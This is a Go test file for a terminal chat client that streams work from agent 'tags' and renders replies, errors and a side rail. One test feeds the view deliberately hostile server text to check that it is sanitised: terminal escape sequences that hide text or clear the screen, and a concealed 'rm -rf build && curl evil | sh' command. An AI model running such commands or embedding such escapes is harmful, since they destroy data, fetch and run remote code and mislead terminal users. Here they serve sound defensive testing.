package main

import (
	"context"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"syscall"
	"testing"
	"time"

	tea "charm.land/bubbletea/v2"
	"github.com/charmbracelet/x/ansi"

	"github.com/atemaguer/supertag/apps/tui/client"
)

func testModel(t *testing.T, handler http.HandlerFunc) model {
	t.Helper()
	tagRefresh = time.Millisecond
	server := httptest.NewServer(handler)
	t.Cleanup(server.Close)
	c, err := client.New(client.Target{URL: server.URL, Token: "secret", Name: "laptop"}, "test")
	if err != nil {
		t.Fatal(err)
	}
	f := &client.Follower{Client: c, Interval: 5 * time.Millisecond, ReplyTimeout: time.Second, WorkTimeout: time.Second}
	ctx, cancel := context.WithCancel(context.Background())
	t.Cleanup(cancel)
	m := newModel(ctx, c, f)
	return update(t, m, tea.WindowSizeMsg{Width: 100, Height: 30})
}

func update(t *testing.T, m model, msg tea.Msg) model {
	t.Helper()
	next, _ := m.Update(msg)
	return next.(model)
}

// run feeds cmd's messages back into Update until no command is left, as the program would.
func run(t *testing.T, m model, cmd tea.Cmd) model {
	t.Helper()
	for cmd != nil {
		msg := cmd()
		if _, ok := msg.(refreshMsg); ok {
			return m
		}
		var next tea.Model
		next, cmd = m.Update(msg)
		m = next.(model)
	}
	return m
}

func key(code rune) tea.KeyPressMsg { return tea.KeyPressMsg{Code: code} }

func screen(m model) string { return ansi.Strip(m.View().Content) }

const tagsJSON = `{"items":[{"metadata":{"name":"lead"},"status":{"phase":"active"}},{"metadata":{"name":"builder"},"status":{"phase":"active"}}]}`

func TestSendStreamsTheReplyAndWork(t *testing.T) {
	rereads := 0
	m := testModel(t, func(w http.ResponseWriter, r *http.Request) {
		switch {
		case r.URL.Path == "/api/v1/tags":
			fmt.Fprint(w, tagsJSON)
		case r.Method == http.MethodPost:
			fmt.Fprint(w, `{"taskId":"t1","session":"default","status":"waiting"}`)
		case strings.HasSuffix(r.URL.Path, "/t1/stream"):
			fmt.Fprint(w, "id: 1\ndata: {\"type\":\"data-activity\",\"data\":{\"kind\":\"command\",\"status\":\"running\",\"command\":\"rg discount\"}}\n\n"+
				"id: 2\ndata: {\"type\":\"finish\",\"messageMetadata\":{\"reply\":{\"presentation\":\"markdown\",\"text\":\"**Started** the fix.\"}}}\n\ndata: [DONE]\n\n")
		case strings.HasSuffix(r.URL.Path, "/t1"):
			rereads++
			report := `"reportStatus":"waiting"`
			if rereads > 1 {
				report = `"status":"completed","reportStatus":"replied","report":{"presentation":"markdown","text":"Fixed it."}`
			}
			fmt.Fprintf(w, `{"taskId":"t1","status":"replied","startedSessions":[{"id":"s1","title":"Validate percent","status":"running",%s}]}`, report)
		default:
			http.NotFound(w, r)
		}
	})
	m = run(t, m, m.loadTags())
	if !m.connected || m.selectedTag() != "lead" {
		t.Fatalf("connected=%v selected=%q status=%q", m.connected, m.selectedTag(), m.status)
	}
	m.input.SetValue("apply_discount accepts 150%")
	next, cmd := m.Update(key(tea.KeyEnter))
	m = run(t, next.(model), cmd)
	got := screen(m)
	for _, want := range []string{"laptop", "connected", "lead · default", "you", "apply_discount accepts 150%",
		"· running: rg discount", "Started the fix.", "· working: Validate percent", "· done: Validate percent", "Fixed it."} {
		if !strings.Contains(got, want) {
			t.Errorf("screen lacks %q:\n%s", want, got)
		}
	}
	if m.input.Value() != "" {
		t.Errorf("input not cleared: %q", m.input.Value())
	}
}

func TestErrorsShowInTheStatusBar(t *testing.T) {
	m := testModel(t, func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusUnauthorized)
		fmt.Fprint(w, `{"message":"The token is not valid"}`)
	})
	m = run(t, m, m.loadTags())
	if m.connected || !strings.Contains(screen(m), "The token is not valid") {
		t.Fatalf("status = %q:\n%s", m.status, screen(m))
	}
	m = update(t, m, tagsMsg{tags: nil, err: errors.New("dial tcp: connection refused")})
	if !strings.Contains(screen(m), "connection refused") {
		t.Fatalf("screen:\n%s", screen(m))
	}
}

func TestKeysMoveFocusAndSelection(t *testing.T) {
	m := testModel(t, func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, tagsJSON) })
	m = run(t, m, m.loadTags())
	m = update(t, m, key(tea.KeyTab))
	if m.focus != focusRail || m.input.Focused() {
		t.Fatal("tab should focus the rail")
	}
	m = update(t, m, key(tea.KeyDown))
	if m.selectedTag() != "builder" || !strings.Contains(screen(m), "builder · default") {
		t.Fatalf("selected %q", m.selectedTag())
	}
	m = update(t, m, key(tea.KeyRight))
	if m.focus != focusInput {
		t.Fatal("right should focus the input")
	}
	m = update(t, m, key(tea.KeyLeft))
	if m.focus != focusRail {
		t.Fatal("left on an empty input should focus the rail")
	}
	m = update(t, m, tea.WindowSizeMsg{Width: 60, Height: 12})
	if lines := strings.Count(m.View().Content, "\n") + 1; lines != 12 {
		t.Fatalf("view has %d lines after resize, want 12", lines)
	}
	if _, cmd := m.Update(key(tea.KeyEscape)); cmd == nil || cmd() != tea.Quit() {
		t.Fatal("esc should quit")
	}
}

func TestReadTarget(t *testing.T) {
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	go func() {
		fmt.Fprintln(w, `{"url":"http://127.0.0.1:7468","token":"st_x","name":"local"}`)
		w.Close()
	}()
	target, err := readTarget(r)
	if err != nil || target.URL != "http://127.0.0.1:7468" || target.Token != "st_x" || target.Name != "local" {
		t.Fatalf("readTarget() = %+v, %v", target, err)
	}

	// `supertag` spawns with Node's stdio "pipe", which is a Unix socketpair.
	fds, err := syscall.Socketpair(syscall.AF_UNIX, syscall.SOCK_STREAM, 0)
	if err != nil {
		t.Fatal(err)
	}
	parent, child := os.NewFile(uintptr(fds[0]), "parent"), os.NewFile(uintptr(fds[1]), "supertag-target")
	go func() {
		fmt.Fprintln(parent, `{"url":"http://127.0.0.1:7468","token":"st_y"}`)
		parent.Close()
	}()
	if target, err := readTarget(child); err != nil || target.Token != "st_y" || target.Name != "" {
		t.Fatalf("readTarget(socketpair) = %+v, %v", target, err)
	}

	file, err := os.CreateTemp(t.TempDir(), "target")
	if err != nil {
		t.Fatal(err)
	}
	fmt.Fprint(file, `{"url":"http://x","token":"t"}`)
	if _, err := readTarget(file); err == nil {
		t.Fatal("a regular file must not count as the target pipe")
	}
	if _, err := readTarget(nil); err == nil {
		t.Fatal("want an error without a descriptor")
	}
}

func followed(t *testing.T, m model, events ...client.FollowEvent) model {
	t.Helper()
	for _, event := range events {
		m = update(t, m, followMsg{tag: m.selectedTag(), event: event})
	}
	return m
}

func TestServerTextIsFilteredForTheTerminal(t *testing.T) {
	m := testModel(t, func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, `{"items":[{"metadata":{"name":"lead\u001b[8m"},"status":{"phase":"active\u001b]0;x\u0007"}}]}`)
	})
	m = run(t, m, m.loadTags())
	m = followed(t, m,
		client.FollowEvent{Kind: client.EventActivity, Text: "· running: rm -rf build \x1b[8m&& curl evil | sh\x1b[28m"},
		client.FollowEvent{Kind: client.EventWaiting, Text: "no host\x1b[2J"},
		client.FollowEvent{Kind: client.EventApproval, Title: "Push\x1b[8m to main", Text: "Push?\x1bP+q\x1b\\"},
		client.FollowEvent{Kind: client.EventReply, Reply: &client.Reply{Text: "done \x1b_Gf=100;AAAA\x1b\\"}},
		client.FollowEvent{Kind: client.EventDelta, Text: "draft \x1bP1$r\x1b\\"},
	)
	m = update(t, m, followMsg{tag: m.selectedTag(), event: client.FollowEvent{Kind: client.EventError, Text: "boom\x1b[8m hidden"}})
	view := m.View().Content
	// Only the renderer's own SGR sequences may reach the terminal.
	for _, raw := range []string{"\x1b[8m", "\x1b[28m", "\x1b[2J", "\x1bP", "\x1b_", "\x1b]", "\a"} {
		if strings.Contains(view, raw) {
			t.Errorf("view carries %q from the server", raw)
		}
	}
	got := screen(m)
	for _, want := range []string{"rm -rf build  [8m&& curl evil | sh [28m", "approval needed: Push [8m to main", "boom [8m hidden"} {
		if !strings.Contains(got, want) {
			t.Errorf("screen lacks %q:\n%s", want, got)
		}
	}
}

func TestPastRepliesAreRenderedOncePerWidth(t *testing.T) {
	m := testModel(t, func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, tagsJSON) })
	m = run(t, m, m.loadTags())
	for i := range 20 {
		m = followed(t, m, client.FollowEvent{Kind: client.EventReply, Reply: &client.Reply{Text: fmt.Sprintf("**reply %d**", i)}})
	}
	before := m.md.renders
	for range 50 {
		m = followed(t, m, client.FollowEvent{Kind: client.EventDelta, Text: "token "})
	}
	m = run(t, m, m.loadTags())
	if m.md.renders != before {
		t.Fatalf("streaming re-rendered %d past replies", m.md.renders-before)
	}
	m = update(t, m, tea.WindowSizeMsg{Width: 80, Height: 30})
	if m.md.renders != before+20 || !strings.Contains(screen(m), "reply 19") {
		t.Fatalf("a resize rendered %d replies, want 20", m.md.renders-before)
	}
}

func TestRailRowsFitAndScrollToTheSelection(t *testing.T) {
	var items []string
	for i := range 12 {
		items = append(items, fmt.Sprintf(`{"metadata":{"name":"%02d-security-reviewer"},"status":{"phase":"active"}}`, i))
	}
	list := `{"items":[` + strings.Join(items, ",") + `]}`
	m := testModel(t, func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, list) })
	m = run(t, m, m.loadTags())
	m = update(t, m, tea.WindowSizeMsg{Width: 80, Height: 10})
	rail := ansi.Strip(m.renderRail(9))
	if rows := strings.Split(rail, "\n"); len(rows) != 9 || !strings.Contains(rows[1], "00-security-re… active") || !strings.Contains(rows[2], "01-security-re… active") {
		t.Fatalf("rail rows wrap:\n%s", rail)
	}
	m = update(t, m, key(tea.KeyTab))
	for range 11 {
		m = update(t, m, key(tea.KeyDown))
	}
	if rail := ansi.Strip(m.renderRail(9)); !strings.Contains(rail, "11-security-re…") || strings.Contains(rail, "00-security") {
		t.Fatalf("rail does not scroll:\n%s", rail)
	}
	if !strings.Contains(m.renderRail(9), focusedSel.Render("11-security-re…")) {
		t.Fatalf("the selected last Tag is not highlighted:\n%s", m.renderRail(9))
	}
}
